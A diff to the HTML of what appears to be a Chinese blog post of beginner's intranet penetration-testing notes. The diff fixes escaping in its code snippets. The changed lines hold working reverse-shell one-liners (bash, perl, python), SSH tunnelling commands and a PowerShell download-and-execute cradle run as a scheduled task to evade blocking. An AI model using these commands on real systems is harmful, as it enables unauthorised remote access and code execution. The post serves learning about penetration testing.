@@ -42,7 +42,7 @@
 <meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/92956616.png">
 <meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2138848702.png">
 <meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/711361399.png">
-<meta property="og:updated_time" content="2017-08-19T15:27:33.199Z">
+<meta property="og:updated_time" content="2017-08-19T15:31:25.652Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0基础内网渗透思路整理与工具使用">
 <meta name="twitter:description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
@@ -262,8 +262,8 @@
 </ol>
 <h3 id="其他的各种各样的姿势的反弹shell："><a href="#其他的各种各样的姿势的反弹shell：" class="headerlink" title="其他的各种各样的姿势的反弹shell："></a>其他的各种各样的姿势的反弹shell：</h3><ol>
 <li>bash:<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></li>
-<li>perl: <code>perl -e \&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\&#39;</code></li>
-<li>python: <code>python -c \&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#39;</code></li>
+<li>perl: <code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></li>
+<li>python: <code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></li>
 </ol>
 <h3 id="使用SSH通道："><a href="#使用SSH通道：" class="headerlink" title="使用SSH通道："></a>使用SSH通道：</h3><p><code>Ssh -qTfnN -L port:host:hostport -l user remote_ip</code> 正向隧道，监听本地port<br><code>Ssh -qTfnN -R port:host:hostport -l user remote_ip</code> 反向隧道，用于内网穿透防火墙限制之类<br><code>Ssh -qTfnN -D port remotehost</code> 直接进行socks代理<br>参数：<br>-q 安静模式<br>-T 不占用shell<br>-f 后台运行，推荐加-n参数<br>-N 不执行远程命令</p>
 <p>SSH端口转发：<br><code>Ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> 本地转发<br><code>Ssh -CfNg -R port2:127.0.0.1:port1 user@hsst</code> 远程转发</p>
@@ -292,7 +292,7 @@
 </ol>
 <h3 id="绕过拦截的计划任务："><a href="#绕过拦截的计划任务：" class="headerlink" title="绕过拦截的计划任务："></a>绕过拦截的计划任务：</h3><ol>
 <li>构造创建计划任务：<code>schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1 #每小时执行一次</code><br><img src="http://hebic.me/usr/uploads/2017/03/3281981286.jpg" alt="计划任务.jpg"></li>
-<li><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(\&#39;http://a.com/1.ps1\&#39;);&quot;</code> 保存以上命令到1.ps一，通过IEX下载执行。<br><img src="http://hebic.me/usr/uploads/2017/03/2122538903.jpg" alt="计划报毒.jpg"> </li>
+<li><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://a.com/1.ps1&#39;);&quot;</code> 保存以上命令到1.ps一，通过IEX下载执行。<br><img src="http://hebic.me/usr/uploads/2017/03/2122538903.jpg" alt="计划报毒.jpg"> </li>
 </ol>
 <p><img src="http://hebic.me/usr/uploads/2017/03/2126598664.jpg" alt="powershell 计划之情.jpg"></p>
 <ol>
